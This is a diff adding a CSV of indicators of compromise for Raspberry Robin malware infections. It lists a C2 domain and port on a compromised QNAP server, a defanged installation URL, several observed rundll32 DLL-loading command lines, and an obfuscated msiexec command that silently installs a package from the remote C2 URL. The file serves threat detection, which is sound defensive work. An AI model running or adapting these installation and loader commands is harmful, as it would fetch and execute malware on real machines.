@@ -1,0 +1,12 @@
+﻿Indicator_type,Data,Note
+Description,IOCs related to recent Raspberry Robin infections,
+domain_port,5qY.ro:8080,Compromised QNAP server used for C2
+url_path,hxxp://5qY.ro:8080/y/cB36RUcKfQKp7SE/oolvooA/p8a/{redacted},URL path used for installation
+command_line,"C:\Windows\System32\rundll32.exe"" SHELL32 ShellExec_RunDLL regsvr32.exe -s ""C:\ProgramData\Wwhm\vsinzf.log","Example command to load DLL without odbccong, instead only using regsvr32 in a straightforward manner"
+command_line,RUNDLL32.EXE C:\ProgramData\EdgeProt\StqrtedRest\AM51edoos_x86.dll FXJooft_hhmme,Observed Raspberry Robin DLL commandline
+command_line,RUNDLL32.EXE C:\ProgramData\FilterBoard\NomorPrtfession\sdiabeft_Vibm02.dll Rqstfo_Web_Ryutclt,Observed Raspberry Robin DLL commandline
+command_line,"C:\Windows\system32\rundll32.EXE C:\ProgramData\GenericMicro\UriloFeatkres\mxiDaas_Pkrces.dll,ROUTnteh__1_0",Observed Raspberry Robin DLL commandline
+command_line,"C:\Windows\SysWOW64\RUNDLL32.EXE C:\ProgramData\WrapAlarm\EnqerprispSxory\tdawty_CredeDEAS.dll,Devce_AdmTxplEditxf_Resohrqeh",Observed Raspberry Robin DLL commandline
+command_line,"RUNDLL32.EXE C:\ProgramData\ComponentsImport\GutlookGate\ades_pbouril.dll,wmsksoft_PoCZ5",Observed Raspberry Robin DLL commandline
+command_line,C:\Windows\SysWOW64\RUNDLL32.EXE C:\ProgramData\GuardShade\UtilitdRlset\dpset_CXVR32.dll CFBBRw_wisdoker,Observed Raspberry Robin DLL commandline
+command_line,"msiEXEC UwAAbX=shmf WRdYMn=aFRmAyQL /q iUde=ODJhzS YDLyOBy=LteB YJbgE=HpiaCV /i""hxxP://5qY[.]Ro:8080/y/cB36RUcKfQKp7SE/oolvooA/p8a/{redacted}"" kFTIeNctT=InnOjRO",Example of Raspberry Robin installation command
